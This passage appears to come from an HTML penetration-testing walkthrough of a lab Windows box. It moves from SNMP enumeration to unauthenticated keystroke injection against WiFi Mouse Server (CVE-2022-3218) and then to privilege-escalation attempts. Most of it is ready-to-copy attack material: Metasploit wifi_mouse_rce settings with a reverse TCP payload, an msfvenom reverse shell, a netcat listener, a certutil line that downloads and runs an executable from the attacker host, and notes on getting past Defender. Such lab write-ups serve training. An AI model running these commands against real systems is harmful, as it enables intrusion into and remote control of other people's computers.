+<h3>2.1 Confirm the agent and the version</h3>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>snmpwalk<span class="w"> </span>-v1<span class="w"> </span>-c<span class="w"> </span>public<span class="w"> </span>-On<span class="w"> </span><span class="m">192</span>.168.103.145<span class="w"> </span><span class="m">1</span>.3.6.1.2.1.1
+</pre></div>
+<div class="block block-out" data-kind="output"><div class="block-bar"><span class="block-tag">output</span></div><pre><span class="plain">.1.3.6.1.2.1.1.1.0 = STRING: "Hardware: AMD64 Family 25 Model 1 Stepping 1 AT/AT COMPATIBLE - Software: Windows Version 6.3 (Build 19041 Multiprocessor Free)"
+.1.3.6.1.2.1.1.2.0 = OID: .1.3.6.1.4.1.311.1.1.3.1.1
+.1.3.6.1.2.1.1.3.0 = Timeticks: (287801) 0:47:58.01
+.1.3.6.1.2.1.1.4.0 = STRING: "zachary"
+.1.3.6.1.2.1.1.5.0 = STRING: "zachary"</span></pre></div>
+<p>Four readings, in order of usefulness:</p>
+<ul>
+<li><strong><code>sysObjectID</code> under <code>1.3.6.1.4.1.311</code></strong> = Microsoft. This is the Windows extension agent, not a
+  network device — so no Cisco-style config-download tricks, and no <code>8072</code> extend tree.</li>
+<li><strong>Build 19041</strong> = Windows 10 2004. Windows SNMP always reports kernel <code>6.3</code> for Win10/11, so the
+  <em>build number</em> is your only OS-version signal. It cannot show patch level — you find that out with
+  a local tool later.</li>
+<li><strong>Uptime <code>0:47:58</code></strong> — freshly booted. On a lab box that means a snapshot was restored, so
+  anything you plant dies at revert.</li>
+<li><strong><code>sysContact</code> = <code>sysName</code> = <code>zachary</code>.</strong> Not a service name. A human one. Keep it: it is a
+  candidate account for SMB/WinRM/RDP if the shell route ever needs a fallback.</li>
+</ul>
+<p>Always add <code>-On</code> (numeric OIDs). MIB-name rendering differs between installs and silently breaks
+parsing later.</p>
+<hr />
+<h3>2.2 Processes — <code>hrSWRunTable</code></h3>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>snmpwalk<span class="w"> </span>-v1<span class="w"> </span>-c<span class="w"> </span>public<span class="w"> </span><span class="m">192</span>.168.103.145<span class="w"> </span><span class="m">1</span>.3.6.1.2.1.25.4.2.1.2<span class="w"> </span><span class="se">\</span>
+<span class="w">  </span><span class="p">|</span><span class="w"> </span>sed<span class="w"> </span>-E<span class="w"> </span><span class="s1">&#39;s/.*STRING: //&#39;</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>sort<span class="w"> </span>-u
+</pre></div>
+<p>47 entries. The ones that mattered:</p>
+<table>
+<thead>
+<tr>
+<th>Process</th>
+<th>Reading</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>MouseServer.exe</code></td>
+<td>the remote-control server, running as a logged-on user</td>
+</tr>
+<tr>
+<td><code>Mouse Server Luminati.exe</code></td>
+<td>same product, Luminati SDK build — a proxy-resale variant</td>
+</tr>
+<tr>
+<td><code>explorer.exe</code>, <code>dwm.exe</code>, <code>sihost.exe</code>, <code>SearchApp.exe</code>, <code>StartMenuExperienceHost.exe</code></td>
+<td><strong>an interactive desktop session is live</strong></td>
+</tr>
+<tr>
+<td><code>w3wp.exe</code></td>
+<td>IIS application-pool worker — a web app exists on some port</td>
+</tr>
+<tr>
+<td><code>MsMpEng.exe</code>, <code>MpDefenderCoreService.exe</code>, <code>SecurityHealthService.exe</code></td>
+<td>Defender is fully active</td>
+</tr>
+<tr>
+<td><code>spoolsv.exe</code></td>
+<td>Print Spooler loaded → PrintNightmare is on the table later</td>
+</tr>
+<tr>
+<td><code>qemu-ga.exe</code>, <code>VGAuthService.exe</code>, <code>vm3dservice.exe</code>, <code>blnsvr.exe</code></td>
+<td>KVM guest with VMware Tools and virtio balloon — a lab VM</td>
+</tr>
+<tr>
+<td><code>snmp.exe</code></td>
+<td>the service we are talking to</td>
+</tr>
+</tbody>
+</table>
+<p>The second row is the single most valuable observation on this box. <code>MouseServer.exe</code> tells you
+<em>what</em> to attack; <code>explorer.exe</code> + <code>dwm.exe</code> + <code>sihost.exe</code> tell you the attack <strong>will work</strong>.
+Keystroke injection needs a desktop to type into — on a headless server the same exploit connects
+and does nothing observable.</p>
+<hr />
+<h3>2.3 Installed software — <code>hrSWInstalledTable</code></h3>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>snmpwalk<span class="w"> </span>-v1<span class="w"> </span>-c<span class="w"> </span>public<span class="w"> </span><span class="m">192</span>.168.103.145<span class="w"> </span><span class="m">1</span>.3.6.1.2.1.25.6.3.1.2<span class="w"> </span><span class="se">\</span>
+<span class="w">  </span><span class="p">|</span><span class="w"> </span>sed<span class="w"> </span>-E<span class="w"> </span><span class="s1">&#39;s/.*STRING: //&#39;</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>sort<span class="w"> </span>-u
+</pre></div>
+<div class="block block-out" data-kind="output"><div class="block-bar"><span class="block-tag">output</span></div><pre><span class="plain">"Cloudbase-Init 1.1.6"
+"Microsoft Edge"
+"Microsoft Edge WebView2 Runtime"
+"Microsoft Update Health Tools"
+"Microsoft Visual C++ 2015-2019 Redistributable (x64) - 14.24.281"
+"Microsoft Visual C++ 2015-2019 Redistributable (x86) - 14.24.281"
+"Microsoft Visual C++ 2019 X64 Additional Runtime - 14.24.28127"
+"Microsoft Visual C++ 2019 X64 Minimum Runtime - 14.24.28127"
+"Microsoft Visual C++ 2019 X86 Additional Runtime - 14.24.28127"
+"Microsoft Visual C++ 2019 X86 Minimum Runtime - 14.24.28127"
+"Mouse Server version 1.7.8.5"
+"PuTTY release 0.76 (64-bit)"
+"QEMU guest agent"
+"Red Hat QXL controller"
+"Spice Agent 0.10.0-5 (64-bit)"
+"Update for Windows 10 for x64-based Systems (KB5001716)"
+"Virtio-win-driver-installer"
+"Virtio-win-guest-tools"
+"VMware Tools"</span></pre></div>
+<table>
+<thead>
+<tr>
+<th>Entry</th>
+<th>Reading</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>Mouse Server version 1.7.8.5</code></td>
+<td><strong>the vulnerable package</strong> — see chapter 03</td>
+</tr>
+<tr>
+<td><code>Cloudbase-Init 1.1.6</code></td>
+<td>OpenStack guest agent; its log often contains the image's injected password</td>
+</tr>
+<tr>
+<td><code>PuTTY release 0.76</code></td>
+<td>old SSH client; saved sessions leak hostnames/usernames, not passwords</td>
+</tr>
+<tr>
+<td><code>VMware Tools</code>, <code>Virtio-win</code>, <code>QEMU guest agent</code>, <code>Spice Agent</code>, <code>Red Hat QXL</code></td>
+<td>confirms the KVM/QEMU lab platform</td>
+</tr>
+<tr>
+<td><code>KB5001716</code></td>
+<td>an update <em>stub</em> — tells you nothing about the cumulative patch level</td>
+</tr>
+</tbody>
+</table>
+<p>That last row is a trap worth naming: a single <code>KB</code> entry in this table is <strong>not</strong> a patch level.
+SNMP on Windows exposes no hotfix list, no registry, no file system, and no domain membership.</p>
+<hr />
+<h3>2.4 Users, services, shares — LAN Manager MIB II</h3>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>snmpwalk<span class="w"> </span>-v1<span class="w"> </span>-c<span class="w"> </span>public<span class="w"> </span>-On<span class="w"> </span><span class="m">192</span>.168.103.145<span class="w"> </span><span class="m">1</span>.3.6.1.4.1.77.1.2.25
+</pre></div>
+<p>The table is indexed by the <strong>ASCII codes</strong> of the account name, so it comes back as
+<code>…svUserName.5.71.117.101.115.116 = STRING: "Guest"</code>. Decode rather than squint:</p>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>snmpwalk<span class="w"> </span>-v1<span class="w"> </span>-c<span class="w"> </span>public<span class="w"> </span>-On<span class="w"> </span><span class="m">192</span>.168.103.145<span class="w"> </span><span class="m">1</span>.3.6.1.4.1.77.1.2.25<span class="w"> </span><span class="se">\</span>
+<span class="w">  </span><span class="p">|</span><span class="w"> </span>sed<span class="w"> </span>-E<span class="w"> </span><span class="s1">&#39;s/.*svUserName\.(([0-9]+\.?)+) = STRING: //&#39;</span><span class="w"> </span><span class="se">\</span>
+<span class="w">  </span><span class="p">|</span><span class="w"> </span><span class="k">while</span><span class="w"> </span><span class="nb">read</span><span class="w"> </span>-r<span class="w"> </span>n<span class="p">;</span><span class="w"> </span><span class="k">do</span><span class="w"> </span><span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;</span><span class="nv">$n</span><span class="s2">&quot;</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>awk<span class="w"> </span>-F.<span class="w"> </span><span class="s1">&#39;{for(i=2;i&lt;=NF;i++) printf &quot;%c&quot;, $i; print &quot;&quot;}&#39;</span><span class="p">;</span><span class="w"> </span><span class="k">done</span>
+</pre></div>
+<p>On this host the table was sparse, and <code>svShareTable</code> (<code>1.3.6.1.4.1.77.1.2.27</code>) returned nothing —
+which is the normal Windows behaviour, not a permissions problem. <strong>Never report "no shares" from
+SNMP.</strong> Use SMB (<code>netexec smb … --shares</code>) once you have any credential.</p>
+<hr />
+<h3>2.5 The dead end, kept for the lesson</h3>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>snmpwalk<span class="w"> </span>-v1<span class="w"> </span>-c<span class="w"> </span>public<span class="w"> </span><span class="m">192</span>.168.103.145<span class="w"> </span><span class="m">1</span>.3.6.1.4.1.8072.1.3.2
+</pre></div>
+<div class="block block-out" data-kind="output"><div class="block-bar"><span class="block-tag">output</span></div><pre><span class="plain">End of MIB</span></pre></div>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>snmpget<span class="w"> </span>-v1<span class="w"> </span>-c<span class="w"> </span>public<span class="w"> </span><span class="m">192</span>.168.103.145<span class="w"> </span><span class="m">1</span>.3.6.1.4.1.8072.1.3.2.4.1.3.5.82.69.83.69.84
+</pre></div>
+<div class="block block-out" data-kind="output"><div class="block-bar"><span class="block-tag">output</span></div><pre><span class="plain">Error in packet
+Reason: (noSuchName) There is no such variable name in this MIB.
+Failed object: iso.3.6.1.4.1.8072.1.3.2.4.1.3.5.82.69.83.69.84</span></pre></div>
+<p>Decode that index: <code>5</code> = length, then <code>82 69 83 69 84</code> = <strong><code>RESET</code></strong>. This is the Linux
+<code>extend RESET /usr/bin/…</code> pattern from countless OSCP writeups — an <code>extend</code> entry whose cached
+output (<code>nsExtendOutput*</code>) leaks command output, sometimes run as root.</p>
+<p>On a Windows host the entire <code>8072</code> tree is empty, because it is not net-snmp. Two signals said so
+before the walk: <code>sysObjectID</code> was <code>1.3.6.1.4.1.311</code> (Microsoft), and <code>sysDescr</code> was Windows. Once
+you know the agent is Microsoft's, stop trying Linux playbooks.</p>
+<table>
+<thead>
+<tr>
+<th>Signal</th>
+<th>Microsoft agent</th>
+<th>net-snmp agent</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>sysObjectID</code></td>
+<td><code>1.3.6.1.4.1.311.*</code></td>
+<td><code>1.3.6.1.4.1.8072.*</code></td>
+</tr>
+<tr>
+<td><code>8072.1.3.2</code> extend tree</td>
+<td>empty</td>
+<td>populated, output cached</td>
+</tr>
+<tr>
+<td><code>hrSWRunTable</code></td>
+<td>full process list</td>
+<td>sparse/absent</td>
+</tr>
+<tr>
+<td><code>hrSWInstalledTable</code></td>
+<td>full software list</td>
+<td>usually absent</td>
+</tr>
+</tbody>
+</table>
+<hr />
+<h3>2.6 What the enumeration produced</h3>
+<div class="block block-out" data-kind="output"><div class="block-bar"><span class="block-tag">output</span></div><pre><span class="plain">UDP/161 public
+  ├─ build 19041, host "zachary", up 48 min
+  ├─ Mouse Server 1.7.8.5 installed        ← vulnerable version
+  ├─ MouseServer.exe running               ← vulnerable service is live
+  ├─ explorer.exe + dwm.exe + sihost.exe   ← interactive desktop ⇒ keystrokes land
+  ├─ w3wp.exe                              ← an IIS site exists somewhere
+  ├─ spoolsv.exe                           ← PrintNightmare candidate for later
+  └─ Defender active                       ← expect payload quarantine</span></pre></div>
+<p>That is a complete attack plan without a single packet sent to a service port. Chapter 03 turns it
+into a decision.</p></div></section>
+<section class="chapter" id="ch-03" data-title="Vulnerability analysis"><div class="ch-head"><span class="ch-num">03</span><div class="ch-title"><h2>Vulnerability analysis</h2><p class="ch-sub">CVE-2022-3218 and its real precondition</p></div><button class="ghost copyall" type="button">Copy commands</button></div><div class="content"><p>Goal: decide, from the inventory in chapter 02, which single route to attack — and confirm its
+preconditions instead of assuming them.</p>
+<hr />
+<h3>3.1 The package</h3>
+<p><code>Mouse Server version 1.7.8.5</code> — Necta's <strong>WiFi Mouse</strong>, a Windows server that lets a phone act as a
+wireless mouse and keyboard. It listens on <strong>TCP 1978</strong> and speaks a tiny line protocol:</p>
+<table>
+<thead>
+<tr>
+<th>Command</th>
+<th>Effect</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>openfile /C/Windows/System32/cmd.exe</code></td>
+<td>launches a program on the desktop</td>
+</tr>
+<tr>
+<td><code>utf8 &lt;text&gt;</code></td>
+<td>types that text into whatever window has focus</td>
+</tr>
+<tr>
+<td><code>key  3RTN</code></td>
+<td>presses Return (two spaces; <code>3RTN</code> is the app's keycode for Enter)</td>
+</tr>
+<tr>
+<td><code>fileexplorer ~/</code></td>
+<td>lists a directory</td>
+</tr>
+</tbody>
+</table>
+<h3>3.2 The flaw — CVE-2022-3218</h3>
+<p>The server has a PIN/"needpassword" feature. The check is implemented <strong>on the mobile client</strong>, not
+on the server: the server <em>announces</em> <code>needpassword</code>, and the app is what pops the PIN dialog. A
+custom client simply ignores the banner and sends the same commands. Result: unauthenticated remote
+keystroke injection.</p>
+<ul>
+<li>Fixed in <strong>2.0.0.5</strong>; every 1.x build is affected.</li>
+<li>Public exploits: <strong>EDB-49601</strong> (Python 2), <strong>EDB-50972</strong> (Python 3 port), <strong>EDB-51072</strong> (1.8.3.2),
+  <strong>EDB-51016</strong> (bash/socat), and Metasploit <code>exploit/windows/misc/wifi_mouse_rce</code>.</li>
+<li>CVSS puts it at critical, but the honest description is: <em>an unauthenticated keyboard on someone
+  else's desktop</em>. It is RCE only because a keyboard can open a command prompt.</li>
+</ul>
+<h3>3.3 Why this box is exploitable and a server would not be</h3>
+<p>Two preconditions, and SNMP answered both before a single TCP packet was sent:</p>
+<table>
+<thead>
+<tr>
+<th>Precondition</th>
+<th>Evidence</th>
+<th>Consequence if absent</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Vulnerable version <strong>installed</strong></td>
+<td><code>hrSWInstalledName</code> → <code>Mouse Server version 1.7.8.5</code></td>
+<td>nothing to attack</td>
+</tr>
+<tr>
+<td>Service <strong>running</strong></td>
+<td><code>hrSWRunName</code> → <code>MouseServer.exe</code></td>
+<td>installed-but-dead = no listener</td>
+</tr>
+<tr>
+<td><strong>Interactive desktop session</strong></td>
+<td><code>explorer.exe</code>, <code>dwm.exe</code>, <code>sihost.exe</code>, <code>SearchApp.exe</code></td>
+<td>exploit connects, types into nothing, silent no-op</td>
+</tr>
+</tbody>
+</table>
+<p>The third is the one people miss. There is no error when keystrokes land nowhere: the socket accepts,
+the commands go out, and nothing happens. Verify the session <em>before</em> firing, so that a failure means
+"wrong payload" instead of "no idea".</p>
+<p>Caveat: a <strong>locked</strong> session (Win+L) still blocks it even though the processes are present. Someone
+has to be logged on <em>and</em> the desktop unlocked.</p>
+<hr />
+<h3>3.4 Confirm the port before choosing a tool</h3>
+<p>The earlier scan had <code>1978/tcp filtered</code>. After the lab was refreshed:</p>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>nmap<span class="w"> </span>-Pn<span class="w"> </span>-sT<span class="w"> </span>-p1977,1978<span class="w"> </span>--max-retries<span class="w"> </span><span class="m">1</span><span class="w"> </span>--reason<span class="w"> </span><span class="m">192</span>.168.103.145
+</pre></div>
+<div class="block block-out" data-kind="output"><div class="block-bar"><span class="block-tag">output</span></div><pre><span class="plain">PORT     STATE    SERVICE        REASON
+1977/tcp filtered tcoaddressbook no-response
+1978/tcp open     unisql         syn-ack</span></pre></div>
+<p><code>1978/tcp open</code> with a <code>syn-ack</code> — the port the exploit needs is reachable. Note that nmap labels it
+<code>unisql</code>; that is just the closest entry in its service table. Port names are guesses, banners are
+facts.</p>
+<p><code>1977/udp</code> is the app's LAN-discovery port. Not needed: we know the address.</p>
+<p>If 1978 had stayed filtered while <code>MouseServer.exe</code> was running, the correct conclusion would be
+"host firewall blocks it" — then look for the IIS app (<code>w3wp.exe</code>) as a way to reach loopback, or a
+pivot. It is not a reason to abandon the box.</p>
+<hr />
+<h3>3.5 Route selection</h3>
+<table>
+<thead>
+<tr>
+<th>Candidate</th>
+<th>Verdict</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Mouse Server 1.7.8.5 → CVE-2022-3218</td>
+<td><strong>primary</strong> — version, process, desktop session all confirmed</td>
+</tr>
+<tr>
+<td>IIS (<code>w3wp.exe</code>) on an unknown port</td>
+<td>hold — we never learned the port; SNMP <code>tcpConnTable</code> would show it</td>
+</tr>
+<tr>
+<td>RDP 3389</td>
+<td>filtered at the time; keep for later, needs credentials</td>
+</tr>
+<tr>
+<td>SMB null session / <code>zachary</code> guesses</td>
+<td>secondary — no shares exposed via SNMP, and guessing risks lockout</td>
+</tr>
+<tr>
+<td>Defender evasion</td>
+<td>not a route, a constraint: the payload must survive AMSI</td>
+</tr>
+</tbody>
+</table>
+<p>One route, chosen on evidence, with the constraint written down. That is the whole decision.</p>
+<hr />
+<h3>3.6 The constraint that shaped everything after</h3>
+<p><code>MsMpEng.exe</code>, <code>MpDefenderCoreService.exe</code> and <code>SecurityHealthService.exe</code> were all running. Any
+executable dropped on disk is scanned on write; a stock <code>msfvenom</code> EXE is a coin flip.</p>
+<p>This is why the Metasploit route below uses <code>windows/shell/reverse_tcp</code> — a staged, memory-resident
+stager rather than a self-contained EXE — and why the later escalation uses a signed PowerShell
+script (PrintNightmare) rather than an unsigned binary. Both choices are Defender decisions, not
+stylistic ones.</p>
+<hr />
+<h3>3.7 Expectation management for what comes next</h3>
+<p>The shell from this exploit runs as the <strong>logged-on user</strong>, not SYSTEM and not an administrator. That
+is not a flaw in the exploit; it is what a keyboard gives you. Chapter 05 shows why the reflex
+answer (<code>getsystem</code>) fails on this box, and chapter 06 shows what to do instead.</p></div></section>
+<section class="chapter" id="ch-04" data-title="Foothold"><div class="ch-head"><span class="ch-num">04</span><div class="ch-title"><h2>Foothold</h2><p class="ch-sub">wifi_mouse_rce → shell as offsec</p></div><button class="ghost copyall" type="button">Copy commands</button></div><div class="content"><p>Goal: get a shell as the logged-on user, and know exactly what privileges it carries before touching
+anything else.</p>
+<hr />
+<h3>4.1 Metasploit — <code>wifi_mouse_rce</code></h3>
+<div class="block block-out" data-kind="output"><div class="block-bar"><span class="block-tag">output</span></div><pre><span class="plain">msfconsole -q
+use exploit/windows/misc/wifi_mouse_rce
+set RHOSTS 192.168.103.145
+set LHOST 192.168.45.158
+set PAYLOAD windows/shell/reverse_tcp
+run</span></pre></div>
+<p>The session table afterwards:</p>
+<div class="block block-out" data-kind="output"><div class="block-bar"><span class="block-tag">output</span></div><pre><span class="plain">sessions -l
+
+Active sessions
+===============
+
+  Id  Name  Type                   Information            Connection
+  --  ----  ----                   -----------            ----------
+  11        shell x86/windows      Shell Banner: Microso  192.168.45.158:4444 -
+                                   ft Windows [Version 1  &gt; 192.168.103.145:509
+                                   0.0.19041.1] -----     15 (192.168.103.145)</span></pre></div>
+<div class="block block-out" data-kind="output"><div class="block-bar"><span class="block-tag">output</span></div><pre><span class="plain">Microsoft Windows [Version 10.0.19041.1]
+(c) 2019 Microsoft Corporation. All rights reserved.
+
+C:\Program Files (x86)\MouseServer.exe&gt;</span></pre></div>
+<p>Note the working directory: <code>C:\Program Files (x86)\</code>. The shell inherits the <em>service's</em>
+context, and MouseServer runs from its install directory. That path is also a reminder of why the
+foothold cannot escalate itself — see 4.5.</p>
+<h4>Why these options</h4>
+<table>
+<thead>
+<tr>
+<th>Option</th>
+<th>Value</th>
+<th>Reason</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>RPORT</code></td>
+<td><code>1978</code> (default)</td>
+<td>the protocol port</td>
+</tr>
+<tr>
+<td><code>PAYLOAD</code></td>
+<td><code>windows/shell/reverse_tcp</code></td>
+<td>staged and small — every byte is <em>typed</em> on the remote desktop</td>
+</tr>
+<tr>
+<td><code>SLEEP</code></td>
+<td><code>1</code> (default)</td>
+<td>delay between typed chunks; raise to 2–3 on a slow VM</td>
+</tr>
+<tr>
+<td><code>LHOST</code></td>
+<td>tun0 address</td>
+<td><code>ifconfig tun0</code> — the lab VPN, not <code>eth0</code></td>
+</tr>
+</tbody>
+</table>
+<p>The payload constraint is the whole trick. This module uses a <strong>command stager</strong>: it types
+<code>certutil</code>/PowerShell lines that download a small stage, then executes it. A 200 KB Meterpreter
+stager typed at ~40 characters per second with a desktop in the middle would drop characters. A
+staged <code>shell/reverse_tcp</code> is the smallest thing that yields a usable session.</p>
+<p><code>ipconfig</code> on the Kali side if <code>LHOST</code> is ever wrong:</p>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>ip<span class="w"> </span>-4<span class="w"> </span>addr<span class="w"> </span>show<span class="w"> </span>tun0<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>inet
+</pre></div>
+<hr />
+<h3>4.2 First actions — establish identity, not access</h3>
+<p>Before exploring:</p>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre><span class="plain">whoami
+whoami /priv
+whoami /groups
+net localgroup administrators</span></pre></div>
+<p>The identity was already visible in Meterpreter:</p>
+<div class="block block-out" data-kind="output"><div class="block-bar"><span class="block-tag">output</span></div><pre><span class="plain">meterpreter &gt; getuid
+Server username: OSCP\offsec</span></pre></div>
+<p><code>OSCP\offsec</code> — a <strong>local</strong> account on machine <code>OSCP</code> (<code>MACHINE\user</code> means a local account, not a
+domain one). <code>sysName</code> said <code>zachary</code>, but <code>sysName</code> is a free-text SNMP string somebody typed; the
+real computer name is what Windows reports. <strong>Trust the OS over the MIB.</strong></p>
+<p><code>zachary</code> was a lead — a possible account for a later credential guess — not the hostname. Keep both
+facts; do not overwrite one with the other.</p>
+<hr />
+<h3>4.3 Upgrade to Meterpreter</h3>
+<div class="block block-out" data-kind="output"><div class="block-bar"><span class="block-tag">output</span></div><pre><span class="plain">sessions -u &lt;id from sessions -l&gt;
+sessions -i &lt;the new id it prints&gt;</span></pre></div>
+<div class="block block-out" data-kind="output"><div class="block-bar"><span class="block-tag">output</span></div><pre><span class="plain">[*] Upgrading session ID: 13
+[*] Starting exploit/multi/handler
+[*] Started reverse TCP handler on 192.168.45.158:4433
+[*] Sending stage (232006 bytes) to 192.168.103.145
+[*] Meterpreter session 14 opened (192.168.45.158:4433 -&gt; 192.168.103.145:50949) at 2026-11-21 02:07:50 -0500
+[*] Stopping exploit/multi/handler</span></pre></div>
+<p>Session ids drift as you upgrade and re-upgrade; always re-read <code>sessions -l</code> instead of assuming the
+next number. Running <code>sessions -u 12</code> when only 11 and 13 existed produced
+<code>[-] Invalid session identifier: 12</code> — harmless, but a good reminder that every <code>sessions</code>
+sub-command takes the id from the table, not from your memory.</p>
+<p>Meterpreter buys three things a raw <code>shell</code> does not: <code>upload</code>/<code>download</code> without SMB, <code>search -f</code>
+across the filesystem, and <code>getsystem</code>. It costs a 232 KB stage over a typed stager — which worked
+here, but is the first thing to suspect if the session dies mid-upgrade.</p>
+<p>A plain <code>shell</code> is enough for everything in this box; the upgrade is for convenience.</p>
+<hr />
+<h3>4.4 The no-Metasploit route (EDB-50972)</h3>
+<p>Same primitive, useful when MSF is unavailable or the command stager is blocked:</p>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>searchsploit<span class="w"> </span>-m<span class="w"> </span><span class="m">50972</span>
+msfvenom<span class="w"> </span>-p<span class="w"> </span>windows/x64/shell_reverse_tcp<span class="w"> </span><span class="nv">LHOST</span><span class="o">=</span><span class="m">192</span>.168.45.158<span class="w"> </span><span class="nv">LPORT</span><span class="o">=</span><span class="m">443</span><span class="w"> </span>-f<span class="w"> </span>exe<span class="w"> </span>-o<span class="w"> </span>s.exe
+python3<span class="w"> </span>-m<span class="w"> </span>http.server<span class="w"> </span><span class="m">80</span>
+nc<span class="w"> </span>-lvnp<span class="w"> </span><span class="m">443</span>
+</pre></div>
+<p>In another pane:</p>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>python3<span class="w"> </span><span class="m">50972</span>.py<span class="w"> </span><span class="m">192</span>.168.103.145<span class="w"> </span><span class="m">192</span>.168.45.158<span class="w"> </span>s.exe
+</pre></div>
+<p>The script types, character by character with a 30 ms delay:</p>
+<div class="block block-out" data-kind="output"><div class="block-bar"><span class="block-tag">output</span></div><pre><span class="plain">openfile /C/Windows/System32/cmd.exe
+certutil.exe -urlcache -f http://192.168.45.158/s.exe C:\Windows\Temp\s.exe
+C:\Windows\Temp\s.exe</span></pre></div>
+<p>Two practical notes from this box's image family:</p>
+<ul>
+<li><strong><code>certutil</code> downloads work where reverse shells often do not.</strong> Defender blocks the <em>execution</em>
+  of stock payloads more reliably than it blocks the download. If the staged EXE never runs, try an
+  in-memory loader instead of a file.</li>
+<li><strong><code>nc.exe</code> fetched but would not execute</strong> on the sibling build of this image. Do not plan around
+  a bare <code>nc</code>.</li>
+</ul>
+<p>The bash variant (EDB-51016) does the same with <code>socat</code>, and includes a <code>fileexplorer</code> mode that
+dumps directory listings over the same socket — handy for reading files when you cannot yet run
+commands:</p>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre><span class="nb">echo</span><span class="w"> </span><span class="s1">&#39;fileexplorer ~/&#39;</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>nc<span class="w"> </span><span class="m">192</span>.168.103.145<span class="w"> </span><span class="m">1978</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>strings
+</pre></div>
+<hr />
+<h3>4.5 What the foothold gives you, precisely</h3>
+<table>
+<thead>
+<tr>
+<th>You have</th>
+<th>You do not have</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Code execution as <code>offsec</code></td>
+<td>Administrator or SYSTEM</td>
+</tr>
+<tr>
+<td>A desktop that accepts keystrokes</td>
+<td><code>SeImpersonatePrivilege</code></td>
+</tr>
+<tr>
+<td>Read access to <code>C:\Users\offsec</code></td>
+<td>Read access to other profiles</td>
+</tr>
+<tr>
+<td><code>certutil</code>, PowerShell, <code>cmd</code></td>
+<td>A patch level you can trust</td>
+</tr>
+</tbody>
+</table>
+<p>Check the last row properly in the next chapter. Build 19041 tells you the release, not the hotfix
+state, and the difference decides which local exploit works.</p>
+<hr />
+<h3>4.6 Cleanup note</h3>
+<p>The command stager leaves a stage on disk (<code>C:\Windows\Temp\…</code> or the user's <code>%TEMP%</code>) and opens a
+console window on the remote desktop that stays visible until the session ends. On a real engagement
+that window is the loudest thing you will do all day — note it in the report, and remove the stage
+before you leave.</p></div></section>
+<section class="chapter" id="ch-05" data-title="Enumeration and dead ends"><div class="ch-head"><span class="ch-num">05</span><div class="ch-title"><h2>Enumeration &amp; dead ends</h2><p class="ch-sub">getsystem 1346, and why potatoes fail</p></div><button class="ghost copyall" type="button">Copy commands</button></div><div class="content"><p>Goal: find out <em>why</em> the reflexive escalation fails, and pick the primitive that actually fits this
+token.</p>
+<hr />
+<h3>5.1 The reflexive attempt, and its exact failure</h3>
+<div class="block block-out" data-kind="output"><div class="block-bar"><span class="block-tag">output</span></div><pre><span class="plain">meterpreter &gt; getsystem
+[-] priv_elevate_getsystem: Operation failed: 1346 The following was attempted:
+[-] Named Pipe Impersonation (In Memory/Admin)
+[-] Named Pipe Impersonation (Dropper/Admin)
+[-] Token Duplication (In Memory/Admin)
+[-] Named Pipe Impersonation (RPCSS variant)
+[-] Named Pipe Impersonation (PrintSpooler variant)
+[-] Named Pipe Impersonation (EFSRPC variant - AKA EfsPotato)</span></pre></div>
+<div class="block block-out" data-kind="output"><div class="block-bar"><span class="block-tag">output</span></div><pre><span class="plain">meterpreter &gt; getuid
+Server username: OSCP\offsec</span></pre></div>
+<p><strong>1346 is <code>ERROR_BAD_IMPERSONATION_LEVEL</code></strong> — "either a required impersonation level was not
+provided, or the provided impersonation level is invalid". In practice, for <code>getsystem</code>, it means the
+current token cannot impersonate a SYSTEM token because it does not hold
+<strong><code>SeImpersonatePrivilege</code></strong>. Every one of the six techniques in that list needs the same thing, which
+is why all six failed identically.</p>
+<p>This is the single most useful error in the whole box. It is not "try harder with the same tool" —
+it is "this primitive is unavailable, change class of attack".</p>
+<hr />
+<h3>5.2 Confirm it from the token itself</h3>
